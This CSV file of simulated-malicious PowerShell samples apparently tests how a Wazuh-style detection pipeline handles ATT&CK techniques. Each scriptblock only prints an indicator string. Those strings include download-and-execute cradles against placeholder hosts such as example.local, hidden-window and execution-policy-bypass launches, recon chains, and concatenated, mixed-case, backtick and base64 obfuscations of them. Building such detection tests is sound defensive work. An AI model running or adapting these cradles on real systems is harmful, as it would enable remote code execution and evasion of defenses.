id,label,class_id,source_family,source_reference_url,tactic,technique,scenario,obfuscation_type,execution_behavior,safety_class,scriptblock,expected_signal,safety_notes
SIM-025,simulated_malicious,1,LOLBAS,https://lolbas-project.github.io/,Defense Evasion,LOLBAS,msbuild_lolbin_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-025'; $indicator = 'MSBuild.exe <placeholder project file>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-026,simulated_malicious,1,Wazuh PowerShell guidance,https://wazuh.com/blog/detecting-powershell-exploitation-techniques-in-windows-using-wazuh/,Persistence,T1546,powershell_profile_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-026'; $indicator = '$PROFILE CurrentUserAllHosts startup script placeholder'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-027,simulated_malicious,1,SigmaHQ PowerShell rules,https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell,Execution,T1059.001,invoke_expression_alias,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-027'; $indicator = 'iex ''<placeholder expression>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-028,simulated_malicious,1,Elastic detection rules,https://github.com/elastic/detection-rules/tree/main/rules/windows,Command and Control,T1059.001,invoke_webrequest_alias,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-028'; $indicator = 'iwr ''http://example.local/test'' -UseBasicParsing'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-029,simulated_malicious,1,Microsoft Sentinel detections,https://github.com/Azure/Azure-Sentinel/tree/master/Detections,Execution,T1059.001,curl_alias_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-029'; $indicator = 'curl ''http://example.local/test.ps1'' | iex'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-030,simulated_malicious,1,Atomic Red Team T1059.001,https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,Defense Evasion,T1059.001,encoded_blob_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-030'; $indicator = 'SQBFAFgAIAAoAGcAYwBtACAAJwAqACcAKQA= PowerShell-like encoded placeholder'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-031,simulated_malicious,1,MITRE ATT&CK T1059.001,https://attack.mitre.org/techniques/T1059/001/,Discovery,T1087,environment_recon_chain,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-031'; $indicator = 'whoami; hostname; ipconfig /all; net user'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-032,simulated_malicious,1,Wazuh PowerShell guidance,https://wazuh.com/blog/detecting-powershell-exploitation-techniques-in-windows-using-wazuh/,Discovery,T1057,process_recon_chain,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-032'; $indicator = 'Get-Process; Get-Service; Get-NetTCPConnection'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-033,simulated_malicious,1,SigmaHQ PowerShell rules,https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell,Discovery,T1083,file_recon_chain,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-033'; $indicator = 'Get-ChildItem -Recurse -Path $env:USERPROFILE -Include *.txt,*.docx'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-034,simulated_malicious,1,Elastic detection rules,https://github.com/elastic/detection-rules/tree/main/rules/windows,Collection,T1115,clipboard_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-034'; $indicator = 'Get-Clipboard | Out-String'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-035,simulated_malicious,1,Microsoft Sentinel detections,https://github.com/Azure/Azure-Sentinel/tree/master/Detections,Collection,T1113,screen_capture_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-035'; $indicator = 'Add-Type -AssemblyName System.Windows.Forms; <screen capture placeholder>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-036,simulated_malicious,1,Atomic Red Team T1059.001,https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,Command and Control,T1071,dns_txt_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-036'; $indicator = 'Resolve-DnsName -Type TXT example.local'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-037,simulated_malicious,1,MITRE ATT&CK T1059.001,https://attack.mitre.org/techniques/T1059/001/,Command and Control,T1090,proxy_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-037'; $indicator = '[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-038,simulated_malicious,1,Wazuh PowerShell guidance,https://wazuh.com/blog/detecting-powershell-exploitation-techniques-in-windows-using-wazuh/,Defense Evasion,T1027,dynamic_command_reconstruction,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-038'; $indicator = '$cmd = ''Inv'' + ''oke-Expression''; <placeholder only>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-039,simulated_malicious,1,SigmaHQ PowerShell rules,https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell,Defense Evasion,T1027,unicode_escape_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-039'; $indicator = '''\u0069\u0065\u0078'' PowerShell unicode escape placeholder'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-040,simulated_malicious,1,Elastic detection rules,https://github.com/elastic/detection-rules/tree/main/rules/windows,Defense Evasion,T1027,high_entropy_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-040'; $indicator = 'High entropy placeholder: QWxhZGRpbjpPcGVuU2VzYW1lMTIzNDU2Nzg5LytBQkNERUZHSEk='; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
OBF-001,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,encoded_command_flag_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-001'; $parts = @('powershell.ex', 'e -NoProfile ', '-WindowStyle ', 'Hidden -Encod', 'edCommand <BA', 'SE64_PLACEHOL', 'DER>'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-002,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,encoded_command_flag_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-002'; $indicator = 'PoWeRsHeLl.ExE -nOpRoFiLe -WiNdOwStYlE hIdDeN -eNcOdEdCoMmAnD <bAsE64_pLaCeHoLdEr>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-003,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,encoded_command_flag_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-003'; $encoded = 'cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAbgBjAG8AZABlAGQAQwBvAG0AbQBhAG4AZAAgADwAQgBBAFMARQA2ADQAXwBQAEwAQQBDAEUASABPAEwARABFAFIAPgA='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-004,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,encoded_command_flag_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-004'; $indicator = 'power`shell.exe -NoProfile -WindowStyle Hidden -En`codedCom`mand <BASE64_PLACEHOLDER>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-005,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,execution_policy_bypass_flag_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-005'; $parts = @('powershell.e', 'xe -NoProfil', 'e -Execution', 'Policy Bypas', 's -File <pla', 'ceholder.ps1', '>'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-006,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,execution_policy_bypass_flag_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-006'; $indicator = 'PoWeRsHeLl.ExE -nOpRoFiLe -ExEcUtIoNpOlIcY bYpAsS -fIlE <pLaCeHoLdEr.Ps1>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-007,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,execution_policy_bypass_flag_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-007'; $encoded = 'cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgADwAcABsAGEAYwBlAGgAbwBsAGQAZQByAC4AcABzADEAPgA='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-008,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,execution_policy_bypass_flag_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-008'; $indicator = 'power`shell.exe -NoProfile -ExecutionPolicy Bypass -File <placeholder.ps1>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-009,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,downloadstring_cradle_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-009'; $parts = @('Invoke-Expressi', 'on (New-Object ', 'Net.WebClient).', 'DownloadString(', '''http://example', '.local/payload.', 'ps1'')'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-010,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,downloadstring_cradle_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-010'; $indicator = 'InVoKe-ExPrEsSiOn (NeW-oBjEcT nEt.WeBcLiEnT).dOwNlOaDsTrInG(''hTtP://eXaMpLe.LoCaL/pAyLoAd.Ps1'')'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-011,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,downloadstring_cradle_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-011'; $encoded = 'SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBsAG8AYwBhAGwALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-012,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,downloadstring_cradle_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-012'; $indicator = 'In`voke-Ex`pression (New-Object Net.Web`Client).Down`loadStr`ing(''http://example.local/payload.ps1'')'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-013,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,invoke_webrequest_cradle_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-013'; $parts = @('IEX (Invoke-W', 'ebRequest -Us', 'eBasicParsing', ' ''http://exam', 'ple.local/sta', 'ge.ps1'').Cont', 'ent'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-014,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,invoke_webrequest_cradle_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-014'; $indicator = 'IeX (iNvOkE-wEbReQuEsT -uSeBaSiCpArSiNg ''HtTp://ExAmPlE.lOcAl/StAgE.pS1'').cOnTeNt'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-015,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,invoke_webrequest_cradle_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-015'; $encoded = 'SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGwAbwBjAGEAbAAvAHMAdABhAGcAZQAuAHAAcwAxACcAKQAuAEMAbwBuAHQAZQBuAHQA'; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-016,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,invoke_webrequest_cradle_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-016'; $indicator = 'IEX (In`voke-WebRequest -UseBasicParsing ''http://example.local/stage.ps1'').Content'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-017,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,T1059.001,webclient_object_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-017'; $parts = @('New-Object Syste', 'm.Net.WebClient ', '| ForEach-Object', ' { $_.DownloadSt', 'ring(''http://exa', 'mple.local/stage', ''') }'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-018,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,T1059.001,webclient_object_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-018'; $indicator = 'NeW-oBjEcT sYsTeM.nEt.WeBcLiEnT | fOrEaCh-ObJeCt { $_.DoWnLoAdStRiNg(''HtTp://ExAmPlE.lOcAl/StAgE'') }'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-019,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,T1059.001,webclient_object_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-019'; $encoded = 'TgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7ACAAJABfAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBsAG8AYwBhAGwALwBzAHQAYQBnAGUAJwApACAAfQA='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-020,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,T1059.001,webclient_object_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-020'; $indicator = 'New-Object System.Net.Web`Client | ForEach-Object { $_.Down`loadStr`ing(''http://example.local/stage'') }'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-021,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,frombase64_decode_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-021'; $parts = @('[Text.Encoding', ']::Unicode.Get', 'String([Conver', 't]::FromBase64', 'String(''<BASE6', '4_PLACEHOLDER>', '''))'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-022,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,frombase64_decode_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-022'; $indicator = '[TeXt.EnCoDiNg]::UnIcOdE.gEtStRiNg([CoNvErT]::fRoMbAsE64sTrInG(''<bAsE64_pLaCeHoLdEr>''))'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-023,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,frombase64_decode_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-023'; $encoded = 'WwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwA8AEIAQQBTAEUANgA0AF8AUABMAEEAQwBFAEgATwBMAEQARQBSAD4AJwApACkA'; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-024,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,frombase64_decode_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-024'; $indicator = '[Text.Encoding]::Unicode.GetStr`ing([Convert]::FromBase64Str`ing(''<BASE64_PLACEHOLDER>''))'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-025,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,hidden_window_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-025'; $parts = @('Start-Process', ' powershell.e', 'xe -WindowSty', 'le Hidden -Ar', 'gumentList ''<', 'placeholder>'''); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-026,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,hidden_window_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-026'; $indicator = 'StArT-pRoCeSs PoWeRsHeLl.ExE -wInDoWsTyLe HiDdEn -ArGuMeNtLiSt ''<PlAcEhOlDeR>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-027,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,hidden_window_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-027'; $encoded = 'UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwA8AHAAbABhAGMAZQBoAG8AbABkAGUAcgA+ACcA'; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-028,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,hidden_window_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-028'; $indicator = 'Start-Process power`shell.exe -WindowStyle Hidden -ArgumentList ''<placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-029,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,T1059.001,nop_w_hidden_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-029'; $parts = @('powershe', 'll -nop ', '-w hidde', 'n -c ''<p', 'lacehold', 'er comma', 'nd>'''); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
